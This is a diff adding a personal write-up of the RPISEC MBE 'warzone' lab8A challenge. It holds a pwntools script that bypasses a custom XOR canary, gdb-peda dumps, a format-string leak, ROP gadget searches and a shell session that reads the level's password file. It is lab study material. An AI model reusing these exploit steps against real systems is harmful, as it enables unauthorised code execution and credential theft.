@@ -1577,7 +1577,29 @@ This means that the stack-stored canary XOR 0xdeadbeef must equal stack-stored c
 
 OK, for now let's just see if we can bypass the "custom canary" without trying to overwrite the saved RET.
 
+from pwn import *
+settings = {
+    "binary"        : "/levels/lab08/lab8A",
+}
+def exploit():
 
+    # This is to simply check the custom-canary bypass, we are not overwriting anything.
+    p.sendlineafter("Enter Your Favorite Author's Last Name: ","A")
+
+    payload = "B"*16	# fill the buf[24] in findSomeWords()
+    payload = payload + p32(0xdeadbeef)
+	
+    p.sendafter("..I like to read ^_^ <==  ",payload)
+    p.recv()
+	
+    return 0
+
+# Initial setup
+if __name__  == "__main__":
+    binary = ELF(settings['binary'])
+    context.log_level = 'debug'
+    p = process(binary.path,stdin=PTY)
+    exploit()
 
 
 Canary value XOR-ed with 0xdeadbeef: 6483bdef
@@ -1614,4 +1636,457 @@ Canary value XOR-ed with 0xdeadbeef: 6483bdef
 Awesome, so now we can make findSomeWords() cleanly return instead of calling exit(), therefore we can make the program direct the execution to an address we control (overwritten saved RET).
 
 This time we should be able to use nullbytes (read() does not care, as opposed to scanf()), but also we no longer have to use the original canary (because the overwritten one from the stack is taken). We just make sure that bytes buff[15-18] = 0xdeadbeef to get things done.
+
+Well, actually we WILL need the original canary value - to bypass the stack protector.
+
+gdb-peda$ c
+Continuing.
+[----------------------------------registers-----------------------------------]
+EAX: 0xb ('\x0b')
+EBX: 0xbffffa2c ("/bin/python")
+ECX: 0x0
+EDX: 0x0
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6b8 --> 0x80ea08b --> 0xc641c340
+ESP: 0xbffff6e8 --> 0xca83977
+EIP: 0x806f8ff (nop)
+EFLAGS: 0x256 (carry PARITY ADJUST ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x806f8f9:   xchg   ax,ax
+   0x806f8fb:   xchg   ax,ax
+   0x806f8fd:   xchg   ax,ax
+=> 0x806f8ff:   nop
+   0x806f900 <_dl_sysinfo_int80>:       int    0x80
+   0x806f902 <_dl_sysinfo_int80+2>:     ret
+   0x806f903:   lea    esi,[esi+0x0]
+   0x806f909:   lea    edi,[edi+eiz*1+0x0]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6e8 --> 0xca83977
+0004| 0xbffff6ec --> 0x0
+0008| 0xbffff6f0 --> 0x0
+0012| 0xbffff6f4 --> 0x0
+0016| 0xbffff6f8 --> 0x0
+0020| 0xbffff6fc --> 0x0
+0024| 0xbffff700 --> 0x0
+0028| 0xbffff704 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0806f8ff in ?? ()
+gdb-peda$
+
+Weird. All looks good to me:
+
+Breakpoint 1, 0x0806f8ff in ?? ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xb ('\x0b')
+EBX: 0xbffffa2c ("/bin/python")
+ECX: 0x0
+EDX: 0x0
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6b8 --> 0x80ea08b --> 0xc641c340
+ESP: 0xbffff6e8 --> 0xca83977
+EIP: 0x806f900 (<_dl_sysinfo_int80>:    int    0x80)
+EFLAGS: 0x256 (carry PARITY ADJUST ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x806f8fb:   xchg   ax,ax
+   0x806f8fd:   xchg   ax,ax
+   0x806f8ff:   nop
+=> 0x806f900 <_dl_sysinfo_int80>:       int    0x80
+   0x806f902 <_dl_sysinfo_int80+2>:     ret
+   0x806f903:   lea    esi,[esi+0x0]
+   0x806f909:   lea    edi,[edi+eiz*1+0x0]
+   0x806f910 <_dl_aux_init>:    mov    edx,DWORD PTR [eax]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6e8 --> 0xca83977
+0004| 0xbffff6ec --> 0x0
+0008| 0xbffff6f0 --> 0x0
+0012| 0xbffff6f4 --> 0x0
+0016| 0xbffff6f8 --> 0x0
+0020| 0xbffff6fc --> 0x0
+0024| 0xbffff700 --> 0x0
+0028| 0xbffff704 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0806f900 in _dl_sysinfo_int80 ()
+
+
+OK, interestingly, int 0x80 did not work for some reason and EAX contains the error code:
+
+Legend: code, data, rodata, value
+0x0806f900 in _dl_sysinfo_int80 ()
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+EAX: 0xfffffffe
+EBX: 0xbffffa2c ("/bin/python")
+ECX: 0x0
+EDX: 0x0
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffff6b8 --> 0x80ea08b --> 0xc641c340
+ESP: 0xbffff6e8 --> 0xca83977
+EIP: 0x806f902 (<_dl_sysinfo_int80+2>:  ret)
+EFLAGS: 0x256 (carry PARITY ADJUST ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x806f8fd:   xchg   ax,ax
+   0x806f8ff:   nop
+   0x806f900 <_dl_sysinfo_int80>:       int    0x80
+=> 0x806f902 <_dl_sysinfo_int80+2>:     ret
+   0x806f903:   lea    esi,[esi+0x0]
+   0x806f909:   lea    edi,[edi+eiz*1+0x0]
+   0x806f910 <_dl_aux_init>:    mov    edx,DWORD PTR [eax]
+   0x806f912 <_dl_aux_init+2>:  mov    ds:0x80ee1a4,eax
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6e8 --> 0xca83977
+0004| 0xbffff6ec --> 0x0
+0008| 0xbffff6f0 --> 0x0
+0012| 0xbffff6f4 --> 0x0
+0016| 0xbffff6f8 --> 0x0
+0020| 0xbffff6fc --> 0x0
+0024| 0xbffff700 --> 0x0
+0028| 0xbffff704 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0806f902 in _dl_sysinfo_int80 ()
+gdb-peda$
+
+0xfffffffe = -2 
+
+Find out, the proper way, how to map this to an error constant. This is most likely the reason:
+
+lab8A@warzone:/tmp$ ls -la /usr/bin/python
+lrwxrwxrwx 1 root root 9 Dec 21  2013 /usr/bin/python -> python2.7
+lab8A@warzone:/tmp$ ls -la /usr/bin/python2.7
+-rwxr-xr-x 1 root root 3176896 Mar 22  2014 /usr/bin/python2.7
+lab8A@warzone:/tmp$
+
+/usr/bin/python being a symlink. 
+
+
+LOL
+
+gdb-peda$ searchmem sh 0x08048000 0x080eb000
+Searching for 'sh' in range: 0x8048000 - 0x80eb000
+Found 31 results, display max 31 items:
+lab8A : 0x8051661 (<_IO_wfile_overflow+273>:    jae    0x80516cb <_IO_wfile_overflow+379>)
+lab8A : 0x8094e3a (<__wuflow+10>:       jae    0x8094ea4 <__wuflow+116>)
+lab8A : 0x8094f4a (<__wunderflow+10>:   jae    0x8094fb4 <__wunderflow+116>)
+lab8A : 0x809b413 (<__readonly_area+307>:       jae    0x809b47d <__readonly_area+413>)
+lab8A : 0x80c04f8 ("showing be either a 'communion' or a 'connexion' or a 'composition' of soul and health, and the fact that the bronze is a triangle will be a 'composition' of bronze and triangle, and the fact that a t"...)
+lab8A : 0x80c0b5c ("share/locale")
+lab8A : 0x80c0b95 ("share/locale-langpack")
+lab8A : 0x80c40e8 ("shing detected")
+lab8A : 0x80c43dd --> 0x32006873 ('sh')
+lab8A : 0x80c46c0 ("shlib_handle != ((void *)0)")
+lab8A : 0x80c533b ("shlib")
+lab8A : 0x80c534e ("shlib")
+lab8A : 0x80d3ea1 ("share/zoneinfo")
+lab8A : 0x80d4f0e ("shared object")
+lab8A : 0x80d4fd0 ("short")
+lab8A : 0x80d517a ("shared object descriptor")
+lab8A : 0x80d51e4 ("shared object cannot be dlopen()ed")
+lab8A : 0x80d522a ("shared object requires")
+lab8A : 0x80d5347 ("shared object")
+lab8A : 0x80d55dc ("shared object file")
+lab8A : 0x80d5749 --> 0x63006873 ('sh')
+lab8A : 0x80d5a22 ("shared object, consider re-linking\n")
+lab8A : 0x80d5f14 ("shared libraries")
+lab8A : 0x80d6445 ("should_be_there")
+--More--(25/32)
+lab8A : 0x80d64ff ("shared object not open")
+lab8A : 0x80db850 ("shared library")
+lab8A : 0x80db876 ("shared library")
+lab8A : 0x80db8c7 ("shared libraries")
+lab8A : 0x80db8e6 ("shared library directly")
+lab8A : 0x80db94c ("should be restarted")
+lab8A : 0x80dbaa5 ("shutdown")
+
+gdb-peda$ x/s 0x80c43dd
+0x80c43dd <_dl_x86_cap_flags+157>:      "sh"
+
+gdb-peda$ x/s 0x80c43dd
+0x80c43dd <_dl_x86_cap_flags+157>:      "sh"
+
+OK, after delivering %130$p-%131$p-/bin/sh to the stack:
+
+gdb-peda$ searchmem "/bin/sh"  0xbffdf000 0xc0000000
+Searching for '/bin/sh' in range: 0xbffdf000 - 0xc0000000
+Found 1 results, display max 1 items:
+[stack] : 0xbffff4ae ("/bin/sh")
+EBP: 0xbffff6c8
+
+OK, let's see if this does not get overwritten after findSomeWords() call:
+
+Breakpoint 2, 0x0804913d in findSomeWords ()
+gdb-peda$ x/s 0xbffff4ae
+0xbffff4ae:     "/bin/sh"
+gdb-peda$
+
+Nah, we're good.
+
+gdb-peda$ p 0xbffff6c8-0xbffff4ae
+$1 = 0x21a
+
+
+gdb-peda$ searchmem /bin/sh 0xbffdf000 0xc0000000
+Searching for '/bin/sh' in range: 0xbffdf000 - 0xc0000000
+Found 1 results, display max 1 items:
+[stack] : 0xbffff4ae ("/bin/sh")
+
+    binary = ELF(settings['binary'])
+    context.log_level = 'debug'
+    p = process(binary.path,stdin=PTY)
+    exploit()$ $ id
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x44 bytes:
+    'uid=1031(lab8A) gid=1032(lab8A) groups=1032(lab8A),1001(gameuser)\n'
+    '$ '
+uid=1031(lab8A) gid=1032(lab8A) groups=1032(lab8A),1001(gameuser)
+$ $ ls -la /bin/sh
+[DEBUG] Sent 0xf bytes:
+    'ls -la /bin/sh\n'
+[DEBUG] Received 0x38 bytes:
+    'lrwxrwxrwx 1 root root 4 Jun 12  2015 /bin/sh -> dash\n'
+    '$ '
+lrwxrwxrwx 1 root root 4 Jun 12  2015 /bin/sh -> dash
+$ $ ls -la /home/lab08/lab8A
+[DEBUG] Sent 0x19 bytes:
+    'ls -la /home/lab08/lab8A\n'
+[DEBUG] Received 0x41 bytes:
+    'ls: cannot access /home/lab08/lab8A: No such file or directory\n'
+    '$ '
+ls: cannot access /home/lab08/lab8A: No such file or directory
+$ $ ls -la /levels/lab08/lab8A
+[DEBUG] Sent 0x1b bytes:
+    'ls -la /levels/lab08/lab8A\n'
+[DEBUG] Received 0x45 bytes:
+    '-r-xr-x--- 1 lab8end lab8A 742225 Jun 21  2015 /levels/lab08/lab8A\n'
+    '$ '
+-r-xr-x--- 1 lab8end lab8A 742225 Jun 21  2015 /levels/lab08/lab8A
+
+
+LOL, no suid.
+
+Oh, socat & remote.
+
+OK.
+
+Now, another peculiarity. This does NOT work remotely.
+The custom canary bypass does not pass.
+
+OK...
+
+Debugging:
+EAX: 0x80481a8 (<_init>:        push   ebx)
+EBX: 0x80481a8 (<_init>:        push   ebx)
+ECX: 0x80ef840 (0x080ef840)
+EDX: 0xd920f100
+ESI: 0x0
+EDI: 0x80ec00c --> 0x8068100 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
+EBP: 0xbffffc74 --> 0xbffffc98 --> 0x8049990 (<__libc_csu_fini>:        push   ebx)
+ESP: 0xbffffc4c --> 0x0
+EIP: 0x804913b (<findSomeWords+94>:     xor    eax,edx)
+EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8049132 <findSomeWords+85>:        mov    edx,DWORD PTR [eax]
+   0x8049134 <findSomeWords+87>:        mov    eax,ds:0x80edf24
+   0x8049139 <findSomeWords+92>:        mov    eax,DWORD PTR [eax]
+=> 0x804913b <findSomeWords+94>:        xor    eax,edx
+   0x804913d <findSomeWords+96>:        mov    edx,eax
+   0x804913f <findSomeWords+98>:        mov    eax,ds:0x80edf20
+   0x8049144 <findSomeWords+103>:       mov    eax,DWORD PTR [eax]
+   0x8049146 <findSomeWords+105>:       xor    eax,0xdeadbeef
+  
+Breakpoint 1, 0x0804913b in findSomeWords ()
+
+So, it turns out that our payload supposed to fill the buff[24] is not there!
+gdb-peda$ x/100wx $esp
+0xbffffc4c:     0x00000000      0xbffffc58      0x00000800      0x0804f510
+0xbffffc5c:     0x080ec200      0x080c0894      0xbffffc80      0x080481a8 <-- again, survival from selectABook()
+0xbffffc6c:     0x00000000      0xd920f100      0xbffffc98      0x080491eb <-- 0xd920f100  canary
+0xbffffc7c:     0x080c0974      0x00000000      0x00000002      0x00000000
+0xbffffc8c:     0xbffffd24      0x00000001      0xd920f100      0x08049990
+0xbffffc9c:     0x080493da      0x00000001      0xbffffd24      0xbffffd2c
+0xbffffcac:     0x00000000      0x00000000      0x080481a8      0x00000000
+0xbffffcbc:     0x080ec00c      0x08049990      0xcbb28bf4      0x3d6cfa9b
+
+We had the exactly same thing when the buffer was too short (not full 24 bytes). The problem we have now is that it does not contain a SINGLE "B", which is what we fill our buff[24] with!
+
+Prolly something with the fucking output buffering again.
+
+And no, can't get it working. Simply NOTHING is coming to that read() call....
+
+Also, Corb3nik's solution is quite different, his buf[24] payload has 512 "A"s before the canary ebp and saved ret...
+
+And has no 0xdeadbeef string in it. How come?
+
+And it's not accepting any input to the read() call over the network, whatsoever!
+
+Proof (we just connect and press "A", that's it!):
+
+lab8A@warzone:~$ nc localhost 8841
+
+
+
+**********************************************
+{|}  Welcome to QUEND's Beta-Book-Browser  {|}
+**********************************************
+
+        ==> reading is for everyone <==
+        [+] Enter Your Favorite Author's Last Name: A
+A
+
+*************************************************
+{|} Aristote's Metaphysics 350 B.C. Book VIII {|}
+*************************************************
+
+To return to the difficulty which has been stated with respect both to definitions and to numbers, what is the cause of their unity? In the case of all things which have several parts and in which the totality is not, as it were, a mere heap, but the whole is something beside the parts, there is a cause; for even in bodies contact is the cause of unity in some cases, and in others viscosity or some other such quality. And a definition is a set of words which is one not by being connected together, like the Iliad, but by dealing with one object.-What then, is it that makes man one; why is he one and not many, e.g. animal + biped, especially if there are, as some say, an animal-itself and a biped-itself? Why are not those Forms themselves the man, so that men would exist by participation not in man, nor in-one Form, but in two, animal and biped, and in general man would be not one but more than one thing, animal and biped?
+
+...please turn to page 394...
+
+..I like to read ^_^ <==
+
+Woah There
+
+socat is not helping.
+
+So, Corb3nik's solution is actually exploiting the FIRST overflow (without caring about the custom cookie bullshit)... An overflow I thought was not exploitable (because I tried with the wannabe exploit - the first version - which failed as the canary was null-armored)... so why the fuck does his version work, doing exactly the same? Filling the first buff with 512 bytes of garbage and then overwriting the canary with itself and then somehow managing to stuff the EBP and saved RET in, along with all those nullbytes?
+
+I guess I should try that exploit again over the network.
+
+OK, questions to answer:
+1) Why doesn't read work over socat? I guess that has to do with it reading from STDIN, still I am surprised.
+2) How come my first exploit did not get through the null-armored canary via scanf("%s",buff), while Corb3nik's payload contains multiple nulls and works like a charm?
+
+
+So, we are trying to exploit this my way (got back to my wannabe exploit)  - my way means with "A" provided to the third call of selectABook() and there's something weird going on - in spite of providing "A" we see some garbage in the buff, and the only conclusion that comes is that it's some sort of survival/garbage from the previous overflow...
+
+
+Breakpoint 1, 0x08048f35 in selectABook ()
+gdb-peda$ x/500wx $esp
+0xbffff060:     0x080bf7cb      0xbffff068      0xfff6b873      0x0554f0bf	<-- 0xfff6b873 this at 0xbffff068 should be our guy
+0xbffff070:     0x00a95508      0x00000000      0x00000000      0x00000000
+0xbffff080:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff090:     0x00000000      0x080c6060      0x00000000      0x00000000
+0xbffff0a0:     0x00000073      0x080c3f49      0x00000000      0xbffff47f
+0xbffff0b0:     0x00000000      0xbffff27c      0x00000000      0x080bf7cd
+
+Just like in the previous call:
+Breakpoint 1, 0x08048f35 in selectABook ()
+gdb-peda$ x/500wx $esp
+0xbffff274:     0x080bf7cb      0xbffff27c      0x42424242      0x42424242
+0xbffff284:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff294:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff2a4:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff2b4:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff2c4:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff2d4:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff2e4:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff2f4:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff304:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff314:     0x42424242      0x42424242      0x42424242      0x42424242
+...
+0xbffff464:     0x42424242      0x42424242      0x42424242      0x42424242
+0xbffff474:     0x42424242      0x42424242      0x7300e500      0xbffff694
+0xbffff484:     0x08048fcd      0x080bf7f8      0x080bf7d0      0x30333125 	<-- fuck no, actually our ROP does not come through at all..
+0xbffff494:     0x252d7024      0x24313331      0x622f2d70      0x732f6e69 ... I guess because of the nullbyte... so why the fuck does it go 
+0xbffff4a4:     0x00000068      0x00000000      0xbffff59c      0x08048034 ... through in Corb3nik's exploit?
+0xbffff4b4:     0x00000000      0x0809aa11      0x0807079d      0xbffff51a
+0xbffff4c4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff4d4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff4e4:     0x00000000      0x00000000      0x00000000      0x00000000
+0xbffff4f4:     0x00000000      0x080ec570      0x00000018      0x00000000
+
+
+FUCK FUCK FUCK.
+OK, now I understand what the problem is:
+	# EDX = 0
+    ROP = ROP + p32(0x80554f0)	# xor eax eax ;;
+    ROP = ROP + p32(0x80aa955) # xchg edx eax ;;	
+0x080aa955 contains 0a, so it fucks up our scanf() input.
+
+
+ROPeMe>  search xchg ? ?
+Searching for ROP gadget:  xchg ? ? with constraints: []
+0x8057f68L: xchg ebp eax ;;
+0x80790bdL: xchg ebp eax ;;
+0x809f65fL: xchg ebp eax ;;
+0x80aa07cL: xchg edx eax ;;
+0x80aa955L: xchg edx eax ;; <-- instead of this (0a)
+0x80ad0ccL: xchg edx eax ;; <
+0x804b68cL: xchg esp eax ;;
+0x8058028L: xchg esp eax ;;
+0x8098a3bL: xchg esp eax ;;
+
+But - we were building this meticulous ROP chain with the assumption that we cannot use nullbytes, while we acually can, so we can just put a nullbyte on the stack and pop edx... but I want other way around anyway
+
+So, our ROP gets fucked up further... 
+    ROP = ROP + p32(0x80dcbf4) # inc ecx ;; // overflow ECX to 0 <-- 0d seems to be another problem (0xa, 0xb, 0xc, 0xd) - 13, carriage return
+Looks like does the same to scanf() as 0xa.
+
+ROPeMe> search ? ecx
+Searching for ROP gadget:  ? ecx with constraints: []
+0x806e55bL: dec ecx ;;
+0x8083b5aL: dec ecx ;;
+0x80e3e19L: dec ecx ;;
+0x80dcb34L: inc ecx ;;
+0x80dcb8aL: inc ecx ;;
+0x80dcbf4L: inc ecx ;;
+0x80e71c5L: pop ecx ;;
+0x80e2469L: push ecx ;;
+0x80e531eL: push ecx ;;
+
+ROPeMe> search ? ecx ?
+Searching for ROP gadget:  ? ecx ? with constraints: []
+
+ROPeMe> search ? ? ecx
+Searching for ROP gadget:  ? ? ecx with constraints: []
+0x80691b0L: add eax ecx ;;
+0x8069814L: add eax ecx ;;
+0x806985fL: add eax ecx ;;
+0x805bd81L: cmovb eax ecx ;;
+0x807304eL: cmovns eax ecx ;;
+0x8093f74L: cmovnz eax ecx ;;
+0x80b639aL: mov eax ecx ;;
+0x80bc766L: mov esp ecx ;;
+0x80bc816L: mov esp ecx ;;
+0x80bc8d3L: mov esp ecx ;;
+0x805527cL: sub eax ecx ;;
+0x8055286L: sub eax ecx ;;
+0x80623d8L: sub eax ecx ;;
+0x8082a2aL: sub ebp ecx ;;
+
+Not many options for ECX.
+
+OK fuck it:
+0x80
+
+e71c5L: pop ecx ;;
+
+Yeah finally!
+
+$ id
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x48 bytes:
+    'uid=1032(lab8end) gid=1033(lab8end) groups=1033(lab8end),1001(gameuser)\n'
+uid=1032(lab8end) gid=1033(lab8end) groups=1033(lab8end),1001(gameuser)
+$ cat /home/lab8end/.pass
+[DEBUG] Sent 0x18 bytes:
+    'cat /home/lab8end/.pass\n'
+[DEBUG] Received 0x1d bytes:
+    'H4x0r5_d0nt_N33d_m3t4pHYS1c5\n'
+H4x0r5_d0nt_N33d_m3t4pHYS1c5
+[*] Got EOF while reading in interactive
+$ exit
+[DEBUG] Sent 0x5 bytes:
+    'exit\n'
+$
+[*] Interrupted
+[*] Closed connection to 127.0.0.1 port 8841
+
 
